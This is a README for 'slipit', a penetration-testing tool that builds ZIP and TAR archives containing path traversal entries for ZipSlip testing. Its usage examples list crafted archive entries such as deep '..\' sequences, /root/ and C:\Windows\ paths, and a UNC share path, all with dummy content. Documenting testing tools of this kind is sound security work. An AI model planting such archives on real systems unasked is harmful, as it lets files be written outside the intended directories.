### slipit

----

*slipit* is a command line utility for creating archives with path traversal elements.
It is basically a successor of the famous [evilarc](https://github.com/ptoomey3/evilarc)
utility with an extended feature set and improved base functionality.


### Installation

----

*slipit* can be installed via [pip](https://pypi.org/project/pip/) by running the following commands:

```console
$ git clone https://github.com/usdAG/slipit
$ cd slipit
$ python3 setup.py sdist
$ pip3 install --user sdist/* 
```

*slipit* also supports autocompletion for *bash*. To take advantage of autocompletion, you need to have the
[completion-helpers](https://github.com/qtc-de/completion-helpers) project installed. If setup correctly, just
copying the [completion script](./resources/bash_completion.d/slipit) to your ``~/.bash_completion.d`` folder enables
autocompletion.


### Usage

----

```console
[user@box ~]$ slipit -h
usage: slipit [-h] [--archive-type {zip,tar,tgz,bz2}] [--clear] [--debug] [--depth int] [--increment int]
              [--overwrite] [--prefix string] [--multi] [--separator char] [--sequence seq] [--static content]
              [--symlink target] [filename ...] archive

slipit v1.0.0 - Utility for creating ZipSlip archives.

positional arguments:
  filename              filenames to include into the archive
  archive               target archive file

optional arguments:
  -h, --help            show this help message and exit
  --archive-type {zip,tar,tgz,bz2}
                        archive type to use
  --clear               clear the specified archive from traversal items
  --debug               enable verbose error output
  --depth int           number of traversal sequences to use (default=6)
  --increment int       add incremental traversal payloads from <int> to depth
  --overwrite           overwrite the target archive instead of appending to it
  --prefix string       prefix to use before the file name
  --multi               create an archive containing multiple payloads
  --separator char      path separator (default=\)
  --sequence seq        use a custom traversal sequence (default=..{sep})
  --static content      use static content for each input file
  --symlink target      add as symlink (only available for tar archives)
```

*slipit* expects an arbitrary number of input files and the targeted output archive as mandatory command line
parameters. All specified input files are appended to the specified archive including a path traversal prefix
with a depth specified with the `--depth` option (default is 6). The targeted archive format is determined
automatically depending on the file extension for non existing archives or the mime type for already existing
archives. You can also specify the archive type manually by using the `--archive-type` option.

```console
[user@box ~]$ slipit example.zip 
File Name                                             Modified             Size
example/                                       2022-02-02 18:39:00            0
example/images/                                2022-02-02 18:40:16            0
example/images/holiday.png                     2022-02-02 18:40:06        34001
example/images/beach.png                       2022-02-02 18:40:16         2112
example/documents/                             2022-02-02 18:39:48            0
example/documents/invoice.docx                 2022-02-02 18:39:40         3001
example/documents/important.docx               2022-02-02 18:39:48          121
[user@box ~]$ slipit test.txt example.zip 
[user@box ~]$ slipit example.zip 
File Name                                             Modified             Size
example/                                       2022-02-02 18:39:00            0
example/images/                                2022-02-02 18:40:16            0
example/images/holiday.png                     2022-02-02 18:40:06        34001
example/images/beach.png                       2022-02-02 18:40:16         2112
example/documents/                             2022-02-02 18:39:48            0
example/documents/invoice.docx                 2022-02-02 18:39:40         3001
example/documents/important.docx               2022-02-02 18:39:48          121
..\..\..\..\..\..\test.txt                     2022-02-02 18:40:48           36
```

*slipit* expects the specified input files to exist on your local file system and uses the file content of
them within the archive. Often times this is not necessary and you just require dummy content to test for
*ZipSlip* vulnerabilities. This is where the `--static <string>` option can be helpful. When using this option,
only the filenames of the specified input files are used within the archive, while their content is set to `<string>`.

```console
[user@box ~]$ slipit test2.txt example.zip --static 'HELLO WORLD :D'
[user@box ~]$ slipit example.zip 
File Name                                             Modified             Size
example/                                       2022-02-02 18:39:00            0
example/images/                                2022-02-02 18:40:16            0
example/images/holiday.png                     2022-02-02 18:40:06        34001
example/images/beach.png                       2022-02-02 18:40:16         2112
example/documents/                             2022-02-02 18:39:48            0
example/documents/invoice.docx                 2022-02-02 18:39:40         3001
example/documents/important.docx               2022-02-02 18:39:48          121
..\..\..\..\..\..\test.txt                     2022-02-02 18:40:48           36
..\..\..\..\..\..\test2.txt                    2022-02-02 18:45:22           14
```

By using the `--clear` option, you can clear an archive from path traversal payloads.

```console
[user@box ~]$ slipit --clear example.zip 
[user@box ~]$ slipit example.zip 
File Name                                             Modified             Size
example/                                       2022-02-02 18:39:00            0
example/images/                                2022-02-02 18:40:16            0
example/images/holiday.png                     2022-02-02 18:40:06        34001
example/images/beach.png                       2022-02-02 18:40:16         2112
example/documents/                             2022-02-02 18:39:48            0
example/documents/invoice.docx                 2022-02-02 18:39:40         3001
example/documents/important.docx               2022-02-02 18:39:48          121
```

*slipit* also allows to create an archive containing multiple payloads by using the `--multi` option:

```console
[user@box ~]$ slipit test.txt example.zip --static content --multi
[user@box ~]$ slipit example.zip 
File Name                                             Modified             Size
C:\Windows\test.txt                            2022-02-03 09:35:28            7
\\10.10.10.1\share\test.txt                    2022-02-03 09:35:28            7
/root/test.txt                                 2022-02-03 09:35:28            7
../test.txt                                    2022-02-03 09:35:28            7
..\test.txt                                    2022-02-03 09:35:28            7
../../test.txt                                 2022-02-03 09:35:28            7
..\..\test.txt                                 2022-02-03 09:35:28            7
../../../test.txt                              2022-02-03 09:35:28            7
..\..\..\test.txt                              2022-02-03 09:35:28            7
../../../../test.txt                           2022-02-03 09:35:28            7
..\..\..\..\test.txt                           2022-02-03 09:35:28            7
../../../../../test.txt                        2022-02-03 09:35:28            7
..\..\..\..\..\test.txt                        2022-02-03 09:35:28            7
```


### Supported Archive Types

----

Currently, the following archive types are supported (just naming their most common
extension):

* `.zip`
* `.tar`
* `.tar.gz`
* `.tar.bz2`
